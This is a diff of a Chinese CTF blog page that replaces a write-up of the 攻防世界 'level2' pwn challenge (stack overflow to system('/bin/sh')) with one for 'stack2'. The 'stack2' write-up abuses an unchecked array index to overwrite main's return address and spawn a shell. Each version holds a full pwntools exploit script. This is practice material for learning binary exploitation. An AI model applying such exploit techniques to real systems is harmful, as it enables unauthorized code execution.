@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-level2, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-stack2, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>攻防世界pwn-level2 | 小哑师兄</title>
+    <title>攻防世界pwn-stack2 | 小哑师兄</title>
     <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-p97wgp.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-level2</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-stack2</h1>
                 </div>
             </div>
         </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-12
+                    2023-08-02
                 </div>
                 
 
@@ -383,7 +383,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    99
+                    353
                 </div>
                 
 
@@ -413,20 +413,43 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p>
+                <p><em>完成于2023年8月2日</em></p>
+<p><em>最后修改于2023年9月4日</em></p>
+<p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802153857.png" style="zoom:80%;" /></p>
+<p>有栈保护 </p>
+<p>程序主体是一个计算平均数的计算器，存在漏洞的点是数组越界，没有对数组下标进行限制，所有可以对任意地址进行修改<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802155519.png" style="zoom:80%;" /></p>
+<p>该程序中存在<code>system(&quot;/bin/bash)</code>，所以可以利用数组越界去修改函数返回地址，来getshell。<br>只要得到<code>main</code>函数的返回地址在栈中与数组的偏移就可以进行修改。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802160711.png" style="zoom:80%;" /><br>在ida中查看main函数的stack，数组距离main返回地址的偏移为0x70+4 -&gt; 0x74(&#x3D;&#x3D;好像和canary有关&#x3D;&#x3D;)<br>在调试过程中，确定main函数的返回地址与数据首地址的偏移。</p>
+<p>确定偏移后，就可以利用了，但是在本题中无法直接使用<code>system(&#39;/bin/sh&#39;)</code>,需要重新构造一下。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803145720.png" style="zoom:80%;" /><br>可以把<code>/bin/bash</code>截断，将<code>sh</code>传给system利用<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803153602.png" style="zoom:80%;" /><br><code>sh</code>从87开始<br><code>system</code> 可以直接利用<code>call system</code>的地址，也就是<code>0x080485B4</code><br>完整exp如下</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>
-binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>
-whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>参数调用格式</p>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 
+<span class="token comment"># sh = process("./stack2")</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -452,7 +475,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html">https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html</a>
+                    <a href="https://blog.yangsx.cn/ctf-pwn/440df70f.html">https://blog.yangsx.cn/ctf-pwn/440df70f.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -802,13 +825,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/ctf-pwn/4b131921.html">
+                <a href="/ctf-pwn/6d40db96.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-jxyowm.png" class="responsive-img" alt="攻防世界pwn-CGFsb">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-o561j7.jpg" class="responsive-img" alt="攻防世界pwn-string">
                         
-                        <span class="card-title">攻防世界pwn-CGFsb</span>
+                        <span class="card-title">攻防世界pwn-string</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -819,7 +842,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
                         </span>
                         <span class="publish-author">
                             
@@ -851,13 +874,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/ctf-pwn/7d1de980.html">
+                <a href="/ctf-pwn/a1902526.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-zyxvqy.jpg" class="responsive-img" alt="攻防世界pwn-hello_pwn">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-p97wgp.png" class="responsive-img" alt="攻防世界pwn-guess_num">
                         
-                        <span class="card-title">攻防世界pwn-hello_pwn</span>
+                        <span class="card-title">攻防世界pwn-guess_num</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -868,7 +891,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-01
                             </span>
                         <span class="publish-author">
                             
